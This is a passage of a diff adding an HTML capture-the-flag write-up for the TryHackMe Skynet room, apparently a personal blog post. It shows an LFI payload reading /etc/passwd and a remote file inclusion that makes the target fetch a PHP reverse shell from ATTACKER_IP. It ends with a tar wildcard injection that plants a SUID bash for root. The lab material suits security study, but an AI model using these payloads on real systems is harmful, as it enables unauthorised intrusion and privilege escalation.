+            exploit file directly from : "/usr/share/exploitdb/exploits/php/webapps/25971.txt".
+        </p>
+        <br>
+
+        <p>First, I tested for <strong>Local File Inclusion (LFI)</strong> using the following payload :<br />
+            <span><strong><code>"http://10.80.159.232/45********yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"</code></strong></span>
+        </p>
+        <br>
+
+        <p><strong>Breakdown of the attack components:</strong></p>
+        <ul>
+            <li><strong>Vulnerable endpoint :</strong>
+                <span><code>/45********yd/administrator/alerts/alertConfigField.php</code></span>
+            </li>
+            <li><strong>Injection parameter :</strong> <code>urlConfig</code></li>
+            <li><strong>Directory traversal payload :</strong>
+                <span><code>../../../../../../../../../etc/passwd</code></span>
+            </li>
+        </ul>
+        <br>
+
+        <p>The payload instructs the server to navigate from its current web root directory (typically
+            <code>"/var/www/html"</code> on Linux systems) back to the filesystem root and read the
+            <code>"/etc/passwd"</code> file.
+        </p>
+        <br>
+        <img alt="LFI" src="/assets/images/thmImages/thm-skynet-pic11.png" />
+        <br>
+        <p>Well, we can read the system file as you can see from the above image.</p>
+        <br>
+
+        <h2>⚝ Initial Access</h2>
+
+        <p>Now, let's attempt <strong>Remote File Inclusion (RFI)</strong>. This requires several preparation steps :
+        </p>
+        <ol>
+            <li><strong>Prepare a Payload :</strong> We need a PHP reverse shell file.</li>
+            <li><strong>Host the Payload :</strong> We will serve this file locally using a Python HTTP server.</li>
+            <li><strong>Start a Listener :</strong> We must start a netcat listener on the port specified in our reverse
+                shell
+                file.</li>
+        </ol>
+        <br>
+
+        <p>In essence, we will host a PHP reverse shell that, when executed remotely by the target server, should
+            connect back
+            to our machine. If successful, we will receive a connection from the target.
+        </p>
+        <br>
+        <p>This solves the <strong>third question</strong> - "What is the vulnerability called when you can include a
+            remote
+            file for malicious purposes?"
+        </p>
+        <br>
+
+        <p>Let's grab this excellent <strong>php reverse shell</strong> from here - <a
+                href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"
+                target="_blank">"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"</a>.
+            We have to change the
+            <span><strong><code>"$ip = '127.0.0.1';" to attacker ip (typically tun0), and "$port = 1234;"</code></strong></span>
+            (if you want different port).
+        </p>
+        <br>
+
+        <p>Refer to the images below for the setup and execution - </p>
+        <br>
+
+        <p><strong>Host the Payload and Start a Listener :</strong> </p>
+        <img alt="Listener" src="/assets/images/thmImages/thm-skynet-pic12.png" />
+        <br>
+
+        <p>The above image, Left side I started a <strong>http server</strong> and right side started a <strong>netcat
+                listener</strong> on port 4242.</p>
+        <br>
+
+        <p>Now, from the browser I have visited
+            <strong>"http://TARGET_IP/45********yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:8000/php-reverse-shell.php"</strong>
+            like we did for the LFI but this time we are executing a remote file by the target server.
+        </p>
+        <br>
+        <img alt="Reverse Shell" src="/assets/images/thmImages/thm-skynet-pic13.png" />
+        <br>
+
+        <p>Finally, we got a response from the target server as you can see in the above image.</p>
+        <br>
+
+        <img alt="User Flag" src="/assets/images/thmImages/thm-skynet-pic14.png" />
+        <p>We got the <strong>user flag</strong> inside "/home/milesdyson" directory.</p>
+        <br>
+
+        <h2>⚝ Privilege Escalation</h2>
+
+        <p>Now, if we examine the <strong><code>backups</code></strong> directory, we find a shell script
+            (<strong><code>backup.sh</code></strong>) that creates a
+            backup of all content from the <strong><code>"/var/www/html"</code></strong> directory and saves it as
+            <strong><code>backup.tgz</code></strong> in the
+            <strong><code>"/home/milesdyson/backups"</code></strong> directory.
+        </p>
+        <br>
+        <img alt="Backup Script" src="/assets/images/thmImages/thm-skynet-pic15.png" />
+        <br>
+
+        <p>Additionally, checking the system-wide cron jobs with <strong><code>"cat /etc/crontab"</code></strong>
+            reveals that the
+            <strong><code>backup.sh</code></strong> script runs every minute by the root user.
+        </p>
+        <br>
+        <img alt="Crontab" src="/assets/images/thmImages/thm-skynet-pic16.png" />
+        <br>
+
+        <p>We do not have write permissions for the <strong><code>backup.sh</code></strong> script itself, but we can
+            write to the
+            <strong><code>"/var/www/html"</code></strong> directory where the tar command executes. Therefore, we will
+            exploit the
+            <strong><code>'*'</code></strong> wildcard in the tar command to execute our payload. Refer to the image
+            below for detailed implementation.
+        </p>
+        <br>
+        <img alt="Custom Script" src="/assets/images/thmImages/thm-skynet-pic17.png" />
+        <br>
+
+        <p><strong>👉 Command Explanation :</strong></p>
+        <ol>
+            <li><span><strong><code>echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash' &gt; s.sh</code></strong></span>
+                - Creates a shell script that copies the bash binary to <code>"/tmp/bash"</code> and sets the SUID bit,
+                ensuring it always executes with root privileges.
+            </li>
+            <li><span><strong><code>chmod +x s.sh</code></strong></span> - Grants executable permissions to the script.
+            </li>
+            <li><span><strong><code>touch -- '--checkpoint=1'</code></strong><span> - Creates a file named
+                        <code>"--checkpoint=1"</code>.</li>
+            <li><span><strong><code>touch -- '--checkpoint-action=exec=bash s.sh'</code></strong></span> - Creates a
+                file named <code>"--checkpoint-action=exec=bash s.sh"</code>.</li>
+        </ol>
+        <br>
+
+        <p><strong>What to expect ?</strong>
+        <ul>
+            <li>When the <strong>"backup.sh"</strong> script executes it runs the tar backup command.</li>
+            <li>Tar sees all files including <code>--checkpoint=1</code>, <code>--checkpoint-action=exec=sh s.sh</code>,
+                <code>s.sh</code>
+            </li>
+            <li><strong>"<code>--checkpoint=1</code>"</strong> - This is actually a command line argument for tar to
+                tell "Stop and check
+                progress after every file". But we have created a file name with the same so when tar hit it it will get
+                confused
+                and treats it as a command line argument rather than a file name.
+            </li>
+            <li><strong><code>"--checkpoint-action=exec=bash s.sh"</code></strong> - This tells the tar when hit the
+                checkpoint execute the mentioned command here it's <strong>"bash s.sh"</strong>. So basically, our
+                custom script will execute at this point.
+            </li>
+        </ul>
+        <br>
+
+        <img alt="Root Flag" src="/assets/images/thmImages/thm-skynet-pic18.png" />
+        <br>
+
+        <p>We can now locate the bash binary in the <strong><code>"/tmp"</code></strong> directory. To obtain a root shell, we execute
+            <strong><code>"/tmp/bash -p"</code></strong>. The <strong><code>-p</code></strong> flag is crucial as it prevents bash from dropping privileged
+            permissions, allowing us to maintain <strong>root-level access</strong>.
+        </p>
+        <br>
+
+        <p>Finally, we can navigate to the root user's home directory and retrieve the <strong>root flag</strong>.</p>
+        <br>
+
+        <p id="congrt">💻 Happy Hacking 💻</p>
+
+
+    </main>
+
+    <!-- Footer Container  -->
+    <div id="footer-container"></div>
+
+    <!-- Scripts  -->
+    <script src="/scripts/main.js"></script>
+
+</body>
+
+</html>
+
